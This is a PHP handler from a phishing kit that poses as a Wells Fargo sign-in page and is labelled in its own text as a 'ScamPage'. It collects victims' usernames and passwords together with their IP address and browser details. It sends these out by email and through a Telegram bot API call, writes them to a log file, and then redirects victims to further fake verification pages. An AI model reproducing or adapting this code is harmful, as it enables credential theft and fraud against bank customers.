<?php 
/*       
»»————-　★　————-««
*/
	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['username'] ) ) {
		
		$_SESSION['username'] 	  = $_POST['username'];
		$_SESSION['passwrd'] 	  = $_POST['passwrd'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 WELLSFARGO Login 1 ⚫️🌀 ]★　————-««
[USERNAME] 		: {$_SESSION['username']}
[PASSWORD]		: {$_SESSION['passwrd']}

»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 WELLSFARGO ScamPage @SudoBakery️🌀 ]★　————-««
\r\n\r\n
EOT;

		if ($sendtoemail=="yes"){
		$subject = "🏛️ WELLSFARGO Login🏛️  From $ip";
        $headers = "From: 🍁WELLSFARGO Login 1🍁 <wnewfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}
		
		if($saveintxt="yes"){
		$save = fopen("../Logs/Login.txt","a+");
        fwrite($save,$code);
        fclose($save);
		}

	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}
	
	if ($doublelogin=="on"){
		header("Location: ../present?auth/login/present/origin=cob&error=yes");
        exit();
	}
        header("Location: ../accounts_contact?oamo/identity/&token=cjmvJprW2Dw1/mfacontacts_identification");
        exit();
	}
	 else {
		header("Location: ../index.php");
		exit();
	}
?>
